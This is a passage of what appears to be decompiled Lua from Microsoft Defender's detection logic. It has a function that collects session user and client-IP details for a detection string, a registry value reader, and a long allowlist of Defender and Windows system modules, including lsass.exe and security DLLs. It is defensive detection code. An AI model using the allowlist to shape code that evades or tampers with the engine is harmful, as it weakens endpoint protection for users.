    return L1_3
  end
  
  L4_2 = GetCurrentPPID
  L4_2 = L4_2()
  L1_2 = L4_2
  if L1_2 == nil then
    L4_2 = {}
    return L4_2
  end
  L4_2 = ""
  L5_2 = ""
  L6_2 = ""
  L7_2 = ""
  L8_2 = ""
  L9_2 = ""
  L10_2 = ""
  L11_2 = ""
  L12_2 = {}
  L13_2 = MpCommon
  L13_2 = L13_2.WTSUserName
  L12_2.UserName = L13_2
  L13_2 = MpCommon
  L13_2 = L13_2.WTSDomainName
  L12_2.DomainName = L13_2
  L13_2 = MpCommon
  L13_2 = L13_2.WTSClientAddress
  L12_2.ClientIP = L13_2
  L13_2 = MpCommon
  L13_2 = L13_2.WTSClientName
  L12_2.ClientName = L13_2
  L13_2 = MpCommon
  L13_2 = L13_2.WTSIsRemoteSession
  L12_2.IsRemoteSession = L13_2
  L13_2 = L2_2
  L14_2 = L1_2
  L15_2 = L12_2
  L13_2 = L13_2(L14_2, L15_2)
  L14_2 = L13_2.UserName
  if L14_2 then
    L5_2 = L13_2.UserName
  end
  L14_2 = L13_2.DomainName
  if L14_2 then
    L6_2 = L13_2.DomainName
  end
  L14_2 = L13_2.ClientName
  if L14_2 then
    L7_2 = L13_2.ClientName
  end
  L14_2 = L13_2.IsRemoteSession
  if L14_2 then
    L8_2 = L13_2.IsRemoteSession
  end
  L14_2 = L13_2.ClientIP
  if L14_2 then
    L14_2 = type
    L15_2 = L13_2.ClientIP
    L14_2 = L14_2(L15_2)
    if L14_2 == "table" then
      L14_2 = tostring
      L15_2 = L13_2.ClientIP
      L15_2 = L15_2.Address
      L14_2 = L14_2(L15_2)
      L10_2 = L14_2
      L14_2 = tostring
      L15_2 = L13_2.ClientIP
      L15_2 = L15_2.AddressFamily
      L14_2 = L14_2(L15_2)
      L11_2 = L14_2
  end
  else
    L14_2 = tostring
    L15_2 = L13_2.ClientIP
    L14_2 = L14_2(L15_2)
    L10_2 = L14_2
  end
  L14_2 = pcall
  L15_2 = MpCommon
  L15_2 = L15_2.GetUserAccountInfo
  L16_2 = L6_2
  L17_2 = L5_2
  L14_2, L15_2 = L14_2(L15_2, L16_2, L17_2)
  L16_2 = L15_2.UserSid
  if L16_2 then
    L4_2 = L15_2.UserSid
  end
  L16_2 = {}
  L17_2 = {}
  L17_2.Actionable = A0_2
  L18_2 = {}
  L19_2 = {}
  L19_2.entityType = "UserInfo"
  L20_2 = {}
  L21_2 = L5_2 or L21_2
  if not L5_2 then
    L21_2 = ""
  end
  L20_2.UserName = L21_2
  L21_2 = L6_2 or L21_2
  if not L6_2 then
    L21_2 = ""
  end
  L20_2.DomainName = L21_2
  L21_2 = L4_2 or L21_2
  if not L4_2 then
    L21_2 = ""
  end
  L20_2.UserSid = L21_2
  L21_2 = L8_2 or L21_2
  if not L8_2 then
    L21_2 = ""
  end
  L20_2.IsRemoteSession = L21_2
  L21_2 = L7_2 or L21_2
  if not L7_2 then
    L21_2 = ""
  end
  L20_2.RemoteClientName = L21_2
  L19_2.UserInfo = L20_2
  L20_2 = {}
  L20_2.entityType = "IP"
  L21_2 = {}
  L22_2 = L10_2 or L22_2
  if not L10_2 then
    L22_2 = ""
  end
  L21_2.ClientIP = L22_2
  L22_2 = L11_2 or L22_2
  if not L11_2 then
    L22_2 = ""
  end
  L21_2.ClientIPAddressFamily = L22_2
  L22_2 = L3_2
  L23_2 = L10_2
  L22_2 = L22_2(L23_2)
  L21_2.ClientIPAddressType = L22_2
  L20_2.IPInfo = L21_2
  L18_2[1] = L19_2
  L18_2[2] = L20_2
  L17_2.Entities = L18_2
  L16_2.RelatedEntitiesInfo = L17_2
  L17_2 = safeJsonSerialize
  L18_2 = L16_2
  L17_2 = L17_2(L18_2)
  L16_2 = L17_2
  L17_2 = bm
  if L17_2 then
    L17_2 = bm
    L17_2 = L17_2.set_detection_string
    L18_2 = L16_2
    L17_2(L18_2)
  else
    L17_2 = mp
    L17_2 = L17_2.SetDetectionString
    L18_2 = L16_2
    L17_2(L18_2)
  end
  return L16_2
end

addDisruptionInfo = L23_1

function L23_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2
  L2_2 = type
  L3_2 = A0_2
  L2_2 = L2_2(L3_2)
  if L2_2 == "string" then
    L2_2 = type
    L3_2 = A1_2
    L2_2 = L2_2(L3_2)
    if L2_2 == "string" then
      goto lbl_13
    end
  end
  L2_2 = nil
  do return L2_2 end
  ::lbl_13::
  L2_2 = 1
  L3_2 = 2
  L4_2 = 3
  L5_2 = 4
  L6_2 = 7
  L7_2 = 11
  L8_2 = nil
  L9_2 = string
  L9_2 = L9_2.match
  L10_2 = string
  L10_2 = L10_2.lower
  L11_2 = A0_2
  L10_2 = L10_2(L11_2)
  L11_2 = "^hklm"
  L9_2 = L9_2(L10_2, L11_2)
  if L9_2 then
    L9_2 = sysio
    L9_2 = L9_2.RegOpenKey
    L10_2 = A0_2
    L9_2 = L9_2(L10_2)
    if not L9_2 then
      L10_2 = nil
      return L10_2
    end
    L10_2 = sysio
    L10_2 = L10_2.GetRegValueType
    L11_2 = L9_2
    L12_2 = A1_2
    L10_2 = L10_2(L11_2, L12_2)
    if not L10_2 then
      L11_2 = nil
      return L11_2
    end
    if L10_2 == L2_2 or L10_2 == L3_2 then
      L11_2 = sysio
      L11_2 = L11_2.GetRegValueAsString
      L12_2 = L9_2
      L13_2 = A1_2
      L11_2 = L11_2(L12_2, L13_2)
      L8_2 = L11_2
    elseif L10_2 == L4_2 then
      L11_2 = sysio
      L11_2 = L11_2.GetRegValueAsBinary
      L12_2 = L9_2
      L13_2 = A1_2
      L11_2 = L11_2(L12_2, L13_2)
      L8_2 = L11_2
    elseif L10_2 == L5_2 then
      L11_2 = sysio
      L11_2 = L11_2.GetRegValueAsDword
      L12_2 = L9_2
      L13_2 = A1_2
      L11_2 = L11_2(L12_2, L13_2)
      L8_2 = L11_2
    elseif L10_2 == L6_2 then
      L11_2 = sysio
      L11_2 = L11_2.GetRegValueAsMultiString
      L12_2 = L9_2
      L13_2 = A1_2
      L11_2 = L11_2(L12_2, L13_2)
      L8_2 = L11_2
    elseif L10_2 == L7_2 then
      L11_2 = sysio
      L11_2 = L11_2.GetRegValueAsQword
      L12_2 = L9_2
      L13_2 = A1_2
      L11_2 = L11_2(L12_2, L13_2)
      L8_2 = L11_2
    end
    if not L8_2 then
      L11_2 = nil
      return L11_2
    end
  else
    L9_2 = string
    L9_2 = L9_2.match
    L10_2 = string
    L10_2 = L10_2.lower
    L11_2 = A0_2
    L10_2 = L10_2(L11_2)
    L11_2 = "^hkcu"
    L9_2 = L9_2(L10_2, L11_2)
    if L9_2 then
      L9_2 = sysio
      L9_2 = L9_2.RegExpandUserKey
      L10_2 = A0_2
      L9_2 = L9_2(L10_2)
      if L9_2 then
        L10_2 = pairs
        L11_2 = L9_2
        L10_2, L11_2, L12_2 = L10_2(L11_2)
        for L13_2, L14_2 in L10_2, L11_2, L12_2 do
          L15_2 = string
          L15_2 = L15_2.find
          L16_2 = string
          L16_2 = L16_2.lower
          L17_2 = L14_2
          L16_2 = L16_2(L17_2)
          L17_2 = "hkcu@s-1-5-21-"
          L18_2 = 1
          L19_2 = true
          L15_2 = L15_2(L16_2, L17_2, L18_2, L19_2)
          if L15_2 then
            L15_2 = sysio
            L15_2 = L15_2.RegOpenKey
            L16_2 = L14_2
            L15_2 = L15_2(L16_2)
            if L15_2 then
              L16_2 = sysio
              L16_2 = L16_2.GetRegValueType
              L17_2 = L15_2
              L18_2 = A1_2
              L16_2 = L16_2(L17_2, L18_2)
              if not L16_2 then
                L17_2 = nil
                return L17_2
              end
              if L16_2 == L2_2 or L16_2 == L3_2 then
                L17_2 = sysio
                L17_2 = L17_2.GetRegValueAsString
                L18_2 = L15_2
                L19_2 = A1_2
                L17_2 = L17_2(L18_2, L19_2)
                L8_2 = L17_2
              elseif L16_2 == L4_2 then
                L17_2 = sysio
                L17_2 = L17_2.GetRegValueAsBinary
                L18_2 = L15_2
                L19_2 = A1_2
                L17_2 = L17_2(L18_2, L19_2)
                L8_2 = L17_2
              elseif L16_2 == L5_2 then
                L17_2 = sysio
                L17_2 = L17_2.GetRegValueAsDword
                L18_2 = L15_2
                L19_2 = A1_2
                L17_2 = L17_2(L18_2, L19_2)
                L8_2 = L17_2
              elseif L16_2 == L6_2 then
                L17_2 = sysio
                L17_2 = L17_2.GetRegValueAsMultiString
                L18_2 = L15_2
                L19_2 = A1_2
                L17_2 = L17_2(L18_2, L19_2)
                L8_2 = L17_2
              elseif L16_2 == L7_2 then
                L17_2 = sysio
                L17_2 = L17_2.GetRegValueAsQword
                L18_2 = L15_2
                L19_2 = A1_2
                L17_2 = L17_2(L18_2, L19_2)
                L8_2 = L17_2
              end
              if L8_2 then
                break
              end
            end
          end
        end
      end
    end
  end
  return L8_2
end

GetRegistryValue = L23_1

function L23_1(A0_2)
  local L1_2, L2_2, L3_2
  if not A0_2 then
    L1_2 = false
    return L1_2
  end
  L1_2 = string
  L1_2 = L1_2.lower
  L2_2 = A0_2
  L1_2 = L1_2(L2_2)
  A0_2 = L1_2
  L1_2 = {}
  L1_2["mpengine.dll"] = true
  L1_2["ksld.sys"] = true
  L1_2["wdnisdrv.sys"] = true
  L1_2["wdboot.sys"] = true
  L1_2["wdfilter.sys"] = true
  L1_2["wddevflt.sys"] = true
  L1_2["mpuxagent.dll"] = true
  L1_2["mpupdate.dll"] = true
  L1_2["defendercsp.dll"] = true
  L1_2["msmplics.dll"] = true
  L1_2["mpsvc.dll"] = true
  L1_2["mpsensecomm.dll"] = true
  L1_2["mprtp.dll"] = true
  L1_2["endpointdlp.dll"] = true
  L1_2["mpoav.dll"] = true
  L1_2["mdediag.dll"] = true
  L1_2["mpevmsg.dll"] = true
  L1_2["mpasdesc.dll"] = true
  L1_2["mpazsubmit.dll"] = true
  L1_2["mpdlp.dll"] = true
  L1_2["protectionmanagement.dll"] = true
  L1_2["mpclient.dll"] = true
  L1_2["mpcommu.dll"] = true
  L1_2["mpdetourscopyaccelerator.dll"] = true
  L1_2["mpdetours.dll"] = true
  L1_2["mpdefendercoreservice.exe"] = true
  L1_2["configsecuritypolicy.exe"] = true
  L1_2["mpcmdrun.exe"] = true
  L1_2["msmpeng.exe"] = true
  L1_2["mpdlpcmd.exe"] = true
  L1_2["mpdlpservice.exe"] = true
  L1_2["mipdlp.exe"] = true
  L1_2["mipdlp.dll"] = true
  L1_2["dlpuseragent.exe"] = true
  L1_2["nissrv.exe"] = true
  L1_2["nprep.dll"] = true
  L1_2["mpextms.exe"] = true
  L1_2["mpcopyaccelerator.exe"] = true
  L1_2["updateplatform.exe"] = true
  L1_2["mpam-fe.exe"] = true
  L1_2["mpam-d.exe"] = true
  L1_2["mpsigstub.exe"] = true
  L1_2["citool.exe"] = true
  L1_2["securityhealthhost.exe"] = true
  L1_2["taskhostw.exe"] = true
  L1_2["svchost.exe"] = true
  L1_2["services.exe"] = true
  L1_2["wevtutil.exe"] = true
  L1_2["conhost.exe"] = true
  L1_2["wmiprvse.exe"] = true
  L1_2["ntdll.dll"] = true
  L1_2["rpcrt4.dll"] = true
  L1_2["kernelbase.dll"] = true
  L1_2["kernel32.dll"] = true
  L1_2["rpcrtremote.dll"] = true
  L1_2["crypt32.dll"] = true
  L1_2["sechost.dll"] = true
  L1_2["cryptsp.dll"] = true
  L1_2["fwpuclnt.dll"] = true
  L1_2["ucrtbase.dll"] = true
  L1_2["ws2_32.dll"] = true
  L1_2["dnsapi.dll"] = true
  L1_2["combase.dll"] = true
  L1_2["authz.dll"] = true
  L1_2["ktmw32.dll"] = true
  L1_2["advapi32.dll"] = true
  L1_2["bcrypt.dll"] = true
  L1_2["firewallapi.dll"] = true
  L1_2["cryptbase.dll"] = true
  L1_2["userenv.dll"] = true
  L1_2["kernel.appcore.dll"] = true
  L1_2["etwrundown.dll"] = true
  L1_2["devinfoset.dll"] = true
  L1_2["iphlpapi.dll"] = true
  L1_2["cfgmgr32.dll"] = true
  L1_2["user32.dll"] = true
  L1_2["sspicli.dll"] = true
  L1_2["wldap32.dll"] = true
  L1_2["dsparse.dll"] = true
  L1_2["logoncli.dll"] = true
  L1_2["netutils.dll"] = true
  L1_2["dsrole.dll"] = true
  L1_2["samlib.dll"] = true
  L1_2["bcryptprimitives.dll"] = true
  L1_2["daxexec.dll"] = true
  L1_2["container.dll"] = true
  L1_2["msvcp_win.dll"] = true
  L1_2["wc_storage.dll"] = true
  L1_2["filterlib.dll"] = true
  L1_2["ntmarta.dll"] = true
  L1_2["xmllite.dll"] = true
  L1_2["bindfltapi.dll"] = true
  L1_2["unionfs.dll"] = true
  L1_2["oleaut32.dll"] = true
  L1_2["twinapi.appcore.dll"] = true
  L1_2["profapi.dll"] = true
  L1_2["shcore.dll"] = true
  L1_2["usermgrcli.dll"] = true
  L1_2["policymanager.dll"] = true
  L1_2["wtsapi32.dll"] = true
  L1_2["windows.staterepositorycore.dll"] = true
  L1_2["capauthz.dll"] = true
  L1_2["windows.storage.dll"] = true
  L1_2["rmclient.dll"] = true
  L1_2["appxalluserstore.dll"] = true
  L1_2["msvcrt.dll"] = true
  L1_2["appxdeploymentclient.dll"] = true
  L1_2["ole32.dll"] = true
  L1_2["windows.staterepositoryclient.dll"] = true
  L1_2["rstrtmgr.dll"] = true
  L1_2["ncrypt.dll"] = true
  L1_2["shlwapi.dll"] = true
  L1_2["ntasn1.dll"] = true
  L1_2["wintrust.dll"] = true
  L1_2["srvcli.dll"] = true
  L1_2["winspool.drv"] = true
  L1_2["powrprof.dll"] = true
  L1_2["wmiclnt.dll"] = true
  L1_2["umpdc.dll"] = true
  L1_2["msasn1.dll"] = true
  L1_2["dpapi.dll"] = true
  L1_2["cabinet.dll"] = true
  L1_2["browcli.dll"] = true
  L1_2["profext.dll"] = true
  L1_2["gpsvc.dll"] = true
  L1_2["dfscli.dll"] = true
  L1_2["wkscli.dll"] = true
  L1_2["samcli.dll"] = true
  L1_2["sysntfy.dll"] = true
  L1_2["secur32.dll"] = true
  L1_2["wevtapi.dll"] = true
  L1_2["winsta.dll"] = true
  L1_2["diagnosticdatasettings.dll"] = true
  L1_2["gpapi.dll"] = true
  L1_2["shell32.dll"] = true
  L1_2["cldapi.dll"] = true
  L1_2["aepic.dll"] = true
  L1_2["aeinv.dll"] = true
  L1_2["version.dll"] = true
  L1_2["msi.dll"] = true
  L1_2["bcp47lang.dll"] = true
  L1_2["imagehlp.dll"] = true
  L1_2["dbghelp.dll"] = true
  L1_2["regapi.dll"] = true
  L1_2["mpr.dll"] = true
  L1_2["wintypes.dll"] = true
  L1_2["gdi32.dll"] = true
  L1_2["imm32.dll"] = true
  L1_2["faultrep.dll"] = true
  L1_2["wer.dll"] = true
  L1_2["sxs.dll"] = true
  L1_2["servicingbase.dll"] = true
  L1_2["rometadata.dll"] = true
  L1_2["uiautomationcore.dll"] = true
  L1_2["oleacc.dll"] = true
  L1_2["icu.dll"] = true
  L1_2["propsys.dll"] = true
  L1_2["coremessaging.dll"] = true
  L1_2["gdi32full.dll"] = true
  L1_2["dwmapi.dll"] = true
  L1_2["netjoin.dll"] = true
  L1_2["devrtl.dll"] = true
  L1_2["urlmon.dll"] = true
  L1_2["wininet.dll"] = true
  L1_2["credui.dll"] = true
  L1_2["davhlpr.dll"] = true
  L1_2["efsutil.dll"] = true
  L1_2["dsclient.dll"] = true
  L1_2["apphelp.dll"] = true
  L1_2["iertutil.dll"] = true
  L1_2["elscore.dll"] = true
  L1_2["mrmcore.dll"] = true
  L1_2["globinputhost.dll"] = true
  L1_2["msctf.dll"] = true
  L1_2["efswrt.dll"] = true
  L1_2["feclient.dll"] = true
  L1_2["edputil.dll"] = true
  L1_2["srpapi.dll"] = true
  L1_2["systemeventsbrokerclient.dll"] = true
  L1_2["biwinrt.dll"] = true
  L1_2["uxtheme.dll"] = true
  L1_2["d2d1.dll"] = true
  L1_2["wldp.dll"] = true
  L1_2["coml2.dll"] = true
  L1_2["pcacli.dll"] = true
  L1_2["apisethost.appexecutionalias.dll"] = true
  L1_2["shdocvw.dll"] = true
  L1_2["efsadu.dll"] = true
  L1_2["ntshrui.dll"] = true
  L1_2["activationmanager.dll"] = true
  L1_2["coreuicomponents.dll"] = true
  L1_2["windows.fileexplorer.common.dll"] = true
  L1_2["dsreg.dll"] = true
  L1_2["cscapi.dll"] = true
  L1_2["windows.storage.search.dll"] = true
  L1_2["dxcore.dll"] = true
  L1_2["win32u.dll"] = true
  L1_2["searchfolder.dll"] = true
  L1_2["ndfapi.dll"] = true
  L1_2["wdi.dll"] = true
  L1_2["comctl32.dll"] = true
  L1_2["joinutil.dll"] = true
  L1_2["netprovfw.dll"] = true
  L1_2["winbrand.dll"] = true
  L1_2["netbios.dll"] = true
  L1_2["ntdsapi.dll"] = true
  L1_2["winmm.dll"] = true
  L1_2["winmmbase.dll"] = true
  L1_2["mmdevapi.dll"] = true
  L1_2["audioses.dll"] = true
  L1_2["msiltcfg.dll"] = true
  L1_2["devmgr.dll"] = true
  L1_2["setupapi.dll"] = true
  L1_2["newdev.dll"] = true
  L1_2["wofutil.dll"] = true
  L1_2["drvstore.dll"] = true
  L1_2["drvsetup.dll"] = true
  L1_2["dcomp.dll"] = true
  L1_2["activeds.dll"] = true
  L1_2["winhttp.dll"] = true
  L1_2["twinapi.dll"] = true
  L1_2["cryptui.dll"] = true
  L1_2["mfc42.dll"] = true
  L1_2["comdlg32.dll"] = true
  L1_2["printui.dll"] = true
  L1_2["puiapi.dll"] = true
  L1_2["aclui.dll"] = true
  L1_2["dui70.dll"] = true
  L1_2["duser.dll"] = true
  L1_2["print.printsupport.source.dll"] = true
  L1_2["fms.dll"] = true
  L1_2["oledlg.dll"] = true
  L1_2["odbc32.dll"] = true
  L1_2["gdiplus.dll"] = true
  L1_2["windowscodecs.dll"] = true
  L1_2["d3d11.dll"] = true
  L1_2["dxgi.dll"] = true
  L1_2["d3d11on12.dll"] = true
  L1_2["d3d12.dll"] = true
  L1_2["directxdatabasehelper.dll"] = true
  L1_2["d3dscache.dll"] = true
  L1_2["pfclient.dll"] = true
  L1_2["advpack.dll"] = true
  L1_2["pkeyhelper.dll"] = true
  L1_2["languageoverlayutil.dll"] = true
  L1_2["slc.dll"] = true
  L1_2["servicinguapi.dll"] = true
  L1_2["winlangdb.dll"] = true
  L1_2["input.dll"] = true
  L1_2["bcp47mrm.dll"] = true
  L1_2["coreglobconfig.dll"] = true
  L1_2["dbgeng.dll"] = true
  L2_2 = true
  L1_2["dbgmodel.dll"] = L2_2
  L2_2 = "tdh.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "windowsperformancerecordercontrol.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "mfplat.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "rtworkq.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "avrt.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "comppkgsup.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "wincredui.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "cryptngc.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "winscard.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "dwrite.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "textshaping.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "virtdisk.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "chartv.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "gdiext.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "contactactivation.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "commstypehelperutil.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "efsext.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "windows.ui.immersive.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "mftranscode.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "mfasfsrcsnk.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "mfcore.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "mfsensorgroup.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "mf.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "mfnetcore.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "mfnetsrc.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "evr.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "ksuser.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "msfltr32.acm"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "windows.globalization.fontgroups.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "fontgroupsoverride.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "fveapi.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "bcd.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "tbs.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "fvecerts.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "reinfo.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "fveskybackup.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "tpmcoreprovisioning.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "certenroll.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "pcrpf.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "vaultcli.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "efscore.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "edpauditapi.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "winmsipc.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "winipcfile.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "dmenterprisediagnostics.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "dmapisetextimpldesktop.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "msvcp110_win.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "dmcmnutils.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "sppc.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "clipc.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "wdscore.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "omadmapi.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "dmenrollengine.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "cryptxml.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "dmxmlhelputils.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "unenrollhook.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "enterpriseresourcemanager.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "enterprisedataprotectioncsp.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "policymanagerprecheck.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "winbio.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "manageci.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "netapi32.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "linkinfo.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "storageusage.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "direct2ddesktop.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "wtdsensor.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "hwreqchk.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "gamemode.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "resourcepolicyclient.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "popkeycli.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "winbioext.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "vbsapi.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "certca.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "crypttpmeksvc.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "cryptnet.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "ngcutils.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "webauthn.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "webservices.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "noise.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "hid.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "ngcrecovery.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "mdmregistration.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "wwapi.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "iri.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "dmpushproxy.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "declaredconfiguration.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "ngclocal.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "mrmdeploy.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "wtdccm.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "adsldpc.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "httpapi.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "nrtapi.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "familysafetyext.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "coreprivacysettingsstore.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "rasapi32.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "eappcfg.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "rtutils.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "rasman.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "routemsg.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "prxyqry.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "fwpolicyiomgr.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "fwbase.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "wlanapi.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "onexui.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "onex.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "eappprxy.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "wfdsconmgr.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "tapi32.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "esent.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "tokenbinding.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "tdhres.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "websocket.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "webio.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "schannel.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "samsrv.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "lsasrv.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "netlogon.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "kerb3961.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "lsass.exe"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "cryptdll.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "laps.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "setupcl.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "lsaadt.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "camext.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "sspisrv.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "nsi.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
